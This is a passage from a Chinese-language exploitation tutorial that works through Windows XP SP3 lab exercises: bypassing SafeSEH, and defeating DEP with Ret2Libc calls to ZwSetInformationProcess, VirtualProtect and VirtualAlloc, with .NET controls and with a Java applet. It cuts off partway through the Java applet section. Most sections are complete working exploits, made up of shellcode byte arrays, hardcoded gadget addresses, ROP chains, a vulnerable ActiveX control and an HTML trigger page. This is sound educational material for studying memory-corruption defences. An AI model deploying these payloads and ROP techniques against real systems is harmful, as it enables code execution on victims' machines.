	__except(MyException())
	{
	}
}

int main()
{
	test(shellcode);

	return 0;
}
```

运行*.exe, OllyDbg自动附加调试, 可以看到所有模块都不是SafeSEH OFF状态
![](/assets/img/exploit/2017-10-04-safeseh-break-byoutside/0x013-001.png)

利用OllyFindAddr工具搜索跳板指令
![](/assets/img/exploit/2017-10-04-safeseh-break-byoutside/0x013-002.png)

在0x00280b0b找到一条call [ebp+0x30]指令
![](/assets/img/exploit/2017-10-04-safeseh-break-byoutside/0x013-003.png)

继续单步下去完成strcpy
![](/assets/img/exploit/2017-10-04-safeseh-break-byoutside/0x013-004.png)

shellcode的起始栈地址0x0012fe88
![](/assets/img/exploit/2017-10-04-safeseh-break-byoutside/0x013-005.png)

最近的一个SE Handler 0x0012ff64
![](/assets/img/exploit/2017-10-04-safeseh-break-byoutside/0x013-006.png)

组织224 byte的shellcode
```
"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42\x08"
"\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c"
"\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b\x34\xaf\x01"
"\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e\x08\x45\x78\x69"
"\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01"
"\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x67\x20\x20\x01\x68\x79\x30\x75"
"\x6e\x68\x20\x77\x6f\x6f\x89\xe1\xfe\x49\x0b\x31\xc0\x51\x50\xff"
"\xd7"		# shellcode
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"		# 208 byte
"\xe9\x2b\xff\xff\xff\x90\x90\x90"		# jmp -213(208+5)
"\xeb\xf6\x90\x90"		# jmp -10(8+2)
"\x0b\x0b\x28\x00"		# 0x00280b0b call [ebp+0x30], 最后的"\x00"截断不能将shellcode布置在下
```

再来调试过一遍, 当出现除0异常
![](/assets/img/exploit/2017-10-04-safeseh-break-byoutside/0x013-007.png)

程序找到最近的S.E.H结构, 调用Handler, 这里已经覆盖成跳板call [ebp+0x30]
![](/assets/img/exploit/2017-10-04-safeseh-break-byoutside/0x013-008.png)

当无法处理异常, 顺着S.E.H chain找到下一个S.E.H结构, 这里覆盖成短跳jmp -10
![](/assets/img/exploit/2017-10-04-safeseh-break-byoutside/0x013-009.png)

再来一个长跳jmp -213, 直接跳到shellcode
![](/assets/img/exploit/2017-10-04-safeseh-break-byoutside/0x013-010.png)

pwn~
![](/assets/img/exploit/2017-10-04-safeseh-break-byoutside/0x013-011.png)


## 0x014 Ret2Libc实战之利用ZwSetInformationProcess

>[分析环境]  
>系统: Windows XP Professional sp3  
>编译器: VC++ 6.0  
>调试器: OllyDbg 1.10  
>说明: 没有启用GS & SafeS.E.H。

新建一个工程, 帖入以下代码, 选择release版本, 禁止优化
```
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <windows.h>

char shellcode[]=
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";

void test()
{
	char tt[176];
	__asm int 3
	strcpy(tt, shellcode);
}

int main()
{
	HINSTANCE hInst=LoadLibrary("shell32.dll");
	char temp[200];
	test();

	return 0;
}
```

运行*.exe, OllyDbg在int 3断点断下, shellcode起始地址0x0012fdfc, 返回地址0x0012feb0
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x014-001.png)
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x014-002.png)

Plugins->OllyFindAddr->Disable DEP, 检索关闭DEP的入口0x7c93cd24, 再找到一条"mov eax,1 retn"指令0x7c92e252
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x014-003.png)

0x0012feb0-0x0012fdfc=180 byte, 组织188 byte的shellcode
```
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90"		# 180 byte
"\x52\xe2\x92\x7c"		# mov eax,1 retn
"\x24\xcd\x93\x7c"		# 关闭DEP代码的起始地址
```

goto 0x7c93cd24下断, F9直接运行, 在这里捕捉到异常(写入了一个无效地址)
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x014-004.png)
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x014-005.png)

这是由于覆盖掉了ebp, retn时将0x90909090 pop到ebp, 需要将ebp定位到一个可写地址
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x014-005.png)

用OllyFindAddr检索"545D"指令, 在0x5d1d8b85找到一个"push esp pop ebp retn"指令
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x014-006.png)

但造成retn后, esp位于高地址, 当有入栈操作时会覆盖掉传递的参数, shellcode作如下修改
```
...
"\x90\x90\x90\x90"		# 180 byte
"\x52\xe2\x92\x7c"		# mov eax,1 retn
"\x85\x8b\x1d\x5d"		# 修正ebp
"\x24\xcd\x93\x7c"		# 关闭DEP代码的起始地址
```

发现shellcode尾部的关键跳会被覆盖掉, 传入参数能关闭DEP, 但失去跳转到shellcode入口的机会
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x014-007.png)
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x014-008.png)

利用一条retn 0x28指令(0x7c974a19), 让esp增大, 保证不会干扰到shellcode
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x014-009.png)

shellcode作如下修改
```
...
"\x90\x90\x90\x90"		# 180 byte
"\x52\xe2\x92\x7c"		# mov eax,1 retn
"\x85\x8b\x1d\x5d"		# 修正ebp
"\x19\x4a\x97\x7c"		# 增大esp
"\x90\x90\x90\x90"		# junk
"\x24\xcd\x93\x7c"		# 关闭DEP代码的起始地址
```

OD附加上去调试, 关闭了DEP后来到这里, 再来一条jmp esp就能跳回栈区
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x014-010.png)
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x014-011.png)

在0x7dc5c1b4找到一条jmp esp指令, 继续修改shellcode
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x014-012.png)

```
...
"\x90\x90\x90\x90"		# 180 byte
"\x52\xe2\x92\x7c"		# mov eax,1 retn
"\x85\x8b\x1d\x5d"		# 修正ebp
"\x19\x4a\x97\x7c"		# 增大esp
"\xb4\xc1\xc5\x7d"		# jmp esp
"\x24\xcd\x93\x7c"		# 关闭DEP代码的起始地址
```

OD再次附加调试, 现在成功跳回栈区0x0012fec4处, 0x0012fdfc-0x0012fec4=-200
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x014-013.png)

再回跳205 byte(包括跳转指令的5 byte)即可跳到shellcode, 给出完整的shellcode(208 byte)
```
"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42\x08"
"\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c"
"\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b\x34\xaf\x01"
"\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e\x08\x45\x78\x69"
"\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01"
"\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x67\x20\x20\x01\x68\x79\x30\x75"
"\x6e\x68\x20\x77\x6f\x6f\x89\xe1\xfe\x49\x0b\x31\xc0\x51\x50\xff"
"\xd7"		# payload 113 byte
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90"			# 67 byte
"\x52\xe2\x92\x7c"		# mov eax,1 retn
"\x85\x8b\x1d\x5d"		# 修正ebp
"\x19\x4a\x97\x7c"		# 增大esp
"\xb4\xc1\xc5\x7d"		# jmp esp
"\x24\xcd\x93\x7c"		# 关闭DEP代码的起始地址
"\xe9\x33\xff\xff\xff\x90\x90\x90";		# 回跳
```

OD附加上去调试, 现在栈区布局如下
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x014-014.png)

直接F9运行, pwn~
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x014-015.png)


## 0x015 Ret2Libc实战之利用VirtualProtect

>[分析环境]  
>系统: Windows XP Professional sp3  
>编译器: VC++ 6.0  
>调试器: OllyDbg 1.10  
>说明: 没有启用GS & SafeS.E.H  

新建一个工程, 帖入以下代码, 选择release版本, 禁止优化
```
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <windows.h>

char shellcode[]=
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";

void test()
{
	char str[176];
	__asm int 3
	memcpy(str, shellcode, 430);
}

int main()
{
	HINSTANCE hInst=LoadLibrary("shell32.dll");
	char temp[200];
	test();

	return 0;
}
```

运行*.exe, OllyDbg在int 3断点断下, shellcode起始地址0x0012fdfc, 返回地址0x0012feb0
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x015-001.png)
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x015-002.png)

先来看看VirtualProtectEx的传入参数
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x015-003.png)

VirtualProtectEx的入口地址在0x7c801ad4
```
-1						hProcess
ebp+0x8~ebp+0xc:		lpAddress
ebp+0xc~ebp+0x10:		dwSize
ebp+0x10~ebp+0x14:		flNewProtect
ebp+0x14~ebp+0x18:		lpflOldProtect
```
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x015-004.png)

shellcode作如下修改, 源码里memcpy长度改成420
```
...
"\x90\x90\x90\x90"		# 180 byte
"\xd4\x1a\x80\x7c"
```

现在成功到达VirtualProtectEx入口, 但ebp被破坏了
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x015-005.png)
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x015-006.png)

先对ebp进行修正, 利用"push esp pop ebp retn"指令, 在OllyFindAddr检索"545D"机器码
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x015-007.png)

在0x5d1d8b85找到一处, 继续修改shellcode
```
"\x90\x90\x90\x90"		# 180 byte
"\x85\x8b\x1d\x5d"		# 修正ebp
"\x90\x90\x90\x90"		# junk
"\xd4\x1a\x80\x7c"		# VirtualProtectEx
```
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x015-008.png)

修正了ebp, 但retn后esp位于高地址, 增大esp避免压栈破坏shellcode
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x015-009.png)

在0x62c2127a找到一处"retn 0x28"
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x015-010.png)

修改shellcode, 因为修正ebp时的retn4, 需要先填充4 byte的junk再放置VirtualProtectEx
```
"\x90\x90\x90\x90"		# 180 byte
"\x85\x8b\x1d\x5d"		# 修正ebp
"\x7a\x12\xc2\x62"		# 增大esp
"\x90\x90\x90\x90"		# junk
"\xd4\x1a\x80\x7c"		# VirtualProtectEx
```

OD附加调试, 来到VirtualProtectEx入口, ebp=0x0012fee4
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x015-011.png)
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x015-012.png)

VirtualProtectEx传入的第2~5个参数起始于ebp+0x8=0x0012feec, 第1个参数固定为-1
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x015-013.png)

修改shellcode, 241~256 byte依次放置4个参数, 最后一个参数需要指向一个可写地址, 这里我指向了栈上的一个junk
```
"\x90\x90\x90\x90"		# 180 byte
"\x85\x8b\x1d\x5d"		# 修正ebp
"\x7a\x12\xc2\x62"		# 增大esp
"\x90\x90\x90\x90"		# junk
"\xd4\x1a\x80\x7c"		# VirtualProtectEx
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"		# junk
"\xf0\xfd\x12\x00"		# lpAddress, shellcode起始0x0012fdfc, 保险起见地址往前了一点
"\xff\x01\x00\x00"		# dwSize, 511 byte应该够用
"\x40\x00\x00\x00"		# flNewProtect, 固定设置
"\xa0\xfe\x12\x00"		# lpflOldProtect, 可写地址
```

OD附加调试, 调用VirtualProtectEx后返回eax=1, 说明设置成功
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x015-014.png)

继续往下, 来到"retn 10", esp指向0x0012fee8, 后面紧跟4个参数, 在这里放置一条"jmp esp"就能跳回栈上执行shellcode
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x015-015.png)

在0x7d70fa1e找到1条, 注意这里log条目太多最好导出到文件看, 还有部分检索出的地址会报异常, 替换其他的即可
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x015-016.png)

shellcode的236~240 byte修改成"jmp esp"的地址
```
...		# 236 byte
"\x1e\xfa\x70\x7d"
"\xf0\xfd\x12\x00"		# lpAddress, shellcode起始0x0012fdfc, 保险起见地址往前了一点
"\xff\x01\x00\x00"		# dwSize, 511 byte应该够用
"\x40\x00\x00\x00"		# flNewProtect, 固定设置
"\xa0\xfe\x12\x00"		# lpflOldProtect, 可写地址
```

现在已经跳到栈上, 而且正好紧跟VirtualProtectEx的最后1个参数, 给出完整的shellcode
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x015-017.png)

```
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90"		# 180 byte
"\x85\x8b\x1d\x5d"		# 修正ebp
"\x7a\x12\xc2\x62"		# 增大esp
"\x90\x90\x90\x90"		# junk
"\xd4\x1a\x80\x7c"		# VirtualProtectEx
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"		# junk
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\x1e\xfa\x70\x7d"		# jmp esp
"\xf0\xfd\x12\x00"		# lpAddress, shellcode起始0x0012fdfc, 保险起见地址往前了一点
"\xff\x01\x00\x00"		# dwSize, 511 byte应该够用
"\x40\x00\x00\x00"		# flNewProtect, 固定设置
"\xa0\xfe\x12\x00"		# lpflOldProtect, 可写地址
"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42\x08"
"\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c"
"\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b\x34\xaf\x01"
"\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e\x08\x45\x78\x69"
"\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01"
"\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x67\x20\x20\x01\x68\x79\x30\x75"
"\x6e\x68\x20\x77\x6f\x6f\x89\xe1\xfe\x49\x0b\x31\xc0\x51\x50\xff"
"\xd7"		# paylaod 113 byte
```

pwn~
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x015-018.png)


## 0x16 Ret2Libc实战之利用VirtualAlloc

>[分析环境]  
>系统: Windows XP Professional sp3  
>编译器: VC++ 6.0  
>调试器: OllyDbg 1.10  
>说明: 没有启用GS & SafeS.E.H, release版本, 禁用优化  

VirtualAlloc函数说明
```
LPVOID WINAPI VirtualAlloc(
	__in_opt 	LPVOID	lpAddress,
	__in		SIZE_T	dwSize,
	__in		DWORD	flAllocationType,
	__in		DWORD	flProtect		
);
```

先贴入以下代码测试溢出, eip会覆盖成0x90909090
```
#include "stdafx.h"
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <windows.h>

char shellcode[]=
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90"

void test()
{
	char tt[176];
	memcpy(tt,shellcode,450);
}

int main(int argc, char* argv[])
{
	HINSTANCE hInst=LoadLibrary("shell32.dll");
	char temp[200];
	printf("emmmm");
	test();

	return 0;
}
```

然后就是构造rop链先后调用VirtualAlloc & memcpy
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x00.png)

返回eax=0x00030000表示内存分配成功
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x01.png)

VirtualAlloc参数传递栈布局如图
```
······					// junk 180 byte
"\xE5\xE0\x72\x7D"		// push esp pop ebp retn 4
"\xE3\x9A\x80\x7C"		// kernel32.VirtualAllocEx   0x7C809AE3
"\x90\x90\x90\x90"
"\x7d\x99\x80\x7c"		// pop eax retn
"\x00\x00\x03\x00"		// 申请空间起始地址
"\xFF\x00\x00\x00"		// 申请空间大小
"\x00\x10\x00\x00"		// 申请类型
"\x40\x00\x00\x00"		// 申请空间访问地址
"\x9e\x37\xfa\x77"		// address of pop edi pop esi retn
"\xE5\xE0\x72\x7D"		// push esp pop ebp retn 4
"\xb8\x1d\x92\x7c"		// memcpy
"\xc7\xc6\xeb\x77"		// jmp eax
"\x00\x00\x03\x00"		// destination
"\xf8\xfe\x12\x00"      // source
"\xff\x00\x00\x00"		// length
"\x90\x90\x90\x90"
"\x90\x90\x90\x90"
"\x90\x90\x90\x90"
······					// payload 113 byte
```

根据调试得到存放payload的栈地址, pwn~
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x02.png)

由于source地址是调试得到的, 极不稳定, 以下是通用性好些的shellcode
```
······					// junk 180 byte
"\xE5\xE0\x72\x7D"		// push esp pop ebp retn 4
"\xE3\x9A\x80\x7C"		// kernel32.VirtualAllocEx
"\x90\x90\x90\x90"
"\x7d\x99\x80\x7c"		// pop eax retn
"\x00\x00\x03\x00"		// 申请空间起始地址
"\xFF\x00\x00\x00"		// 申请空间大小
"\x00\x10\x00\x00"		// 申请类型
"\x40\x00\x00\x00"		// 申请空间访问地址
"\xB1\x1D\x92\x7C"		// pop esi retn
"\x36\xD4\x5D\x7D"		// pop edi
"\x00\x00\x03\x00"		// destination
"\xA0\x6F\x5F\x7D"		// pop ecx
"\xff\x00\x00\x00"		// length
"\xc6\xc6\xeb\x77"		// source, push esp jmp eax
"\xE5\xE0\x72\x7D"		// push esp pop ebp retn 4
"\xc1\x1d\x92\x7c"		// memcpy
"\x7d\x99\x80\x7c"		// pop eax retn
"\x18\x00\x03\x00"
"\xc7\xc6\xeb\x77"		// jmp eax
"\x90\x90\x90\x90"
"\x90\x90\x90\x90"
"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42\x08"
"\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c"
"\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b\x34\xaf\x01"
"\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e\x08\x45\x78\x69"
"\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01"
"\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x67\x20\x20\x01\x68\x79\x30\x75"
"\x6e\x68\x20\x77\x6f\x6f\x89\xe1\xfe\x49\x0b\x31\xc0\x51\x50\xff"
"\xd7";
```


## 0x017 利用.NET挑战DEP

>[分析环境]  
>系统: Windows XP Professional sp3  
>编译器: Visual Studio 2008 
>调试器: OllyDbg 1.10  

编译ActiveX控件, 注意:
```
1. 禁用优化
2. 关闭GS
3. 在静态库中使用MFC
4. 使用Unicode字符集
5. release版本
```

贴入以下代码, 具体步骤可以参考这片文章: [利用Adobe Flash Player ActiveX控件绕过SafeS.E.H](http://www.wooy0ung.me/exploit/2017/10/04/safeseh-break-byactivex/)
```
void CVulnerAX_DEPCtrl::test(LPCTSTR str)
{
	//AFX_MANAGE_STATE(AfxGetStaticModuleState());

	// TODO: 在此添加调度处理程序代码
	printf("aaaa");
	char dest[100];
	sprintf(dest,"%s",str);
}
```

新建一个.NET控件
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x017-001.png)

设置dll装载基址
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x017-002.png)

贴入以下代码, 选择debug版本, 编译
```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace DEP_NETDLL
{
    public class Class1
    {
        public void Shellcode()
        {
            string shellcode =
            "\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090" +
            "\ud231\u30b2\u8b64\u8b12\u0c52\u528b\u8b1c\u0842" +
            "\u728b\u8b20\u8012\u0c7e\u7533\u89f2\u03c7\u3c78" +
            "\u578b\u0178\u8bc2\u207a\uc701\ued31\u348b\u01af" +
            "\u45c6\u3e81\u6146\u6174\uf275\u7e81\u4508\u6978" +
            "\u7574\u8be9\u247a\uc701\u8b66\u6f2c\u7a8b\u011c" +
            "\u8bc7\uaf7c\u01fc\u68c7\u2067\u0120\u7968\u7530" +
            "\u686e\u7720\u6f6f\ue189\u49fe\u310b\u51c0\uff50" +
            "\u90d7";
        }
    }
}
```

新建一个文本文件, 贴入以下代码, 更名为test.html
```
<html>
<body>
<object classID="DEP_NETDLL.dll#DEP_NETDLL.Class1"></object>
<object classid="clsid:06BC9528-F8A0-456B-BBBB-09C1248BF827" id="test"></object>
<script>
var s="\u9090";
while(s.length<54){
	s+="\u9090";
}
s+="\u9090\u9090";   //s+="\u24E2\u2424";
test.test(s);
</script>
</body>
</html>
```

将VulnerAX_DEP.ocx、DEP_NETDLL.dll、test.html放到IIS服务默认文件夹的wwwroot目录下, 并且注册VulnerAX_DEP.ocx

打开IE7.0, 访问http://127.0.0.1/test.html, 再双击打开test.html文件
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x017-003.png)

来到这里OD附加上去, 选择"E"打开模块, ocx、dll都成功加载
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x017-004.png)

点进去DEP_NETDLL.dll, 找到shellcode的入口0x242424E2
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x017-005.png)

修改test.html
```
<html>
<body>
<object classID="DEP_NETDLL.dll#DEP_NETDLL.Class1"></object>
<object classid="clsid:06BC9528-F8A0-456B-BBBB-09C1248BF827" id="test"></object>
<script>
var s="\u9090";
while(s.length<54){
	s+="\u9090";
}
s+="\u24E2\u2424";
test.test(s);
</script>
</body>
</html>
```

关闭调试, 直接运行, pwn~
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x017-006.png)


## 0x018 利用Java applet挑战DEP

>[分析环境]  
>系统: Windows XP Professional sp3  
>编译器: Visual Studio 2008 
>调试器: OllyDbg 1.10  
>浏览器: Internet Explorer 7  
>JRE版本: 1.4.2_06

新建一个Java applet
```
//Shellcode.java
import java.applet.*;
import java.awt.*;

public class Shellcode extends Applet{
    public void init(){
        Runtime.getRuntime().gc();
        StringBuffer buffer=new StringBuffer(255);

        buffer.append("\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090" +
            "\ud231\u30b2\u8b64\u8b12\u0c52\u528b\u8b1c\u0842" +
            "\u728b\u8b20\u8012\u0c7e\u7533\u89f2\u03c7\u3c78" +
            "\u578b\u0178\u8bc2\u207a\uc701\ued31\u348b\u01af" +
            "\u45c6\u3e81\u6146\u6174\uf275\u7e81\u4508\u6978" +
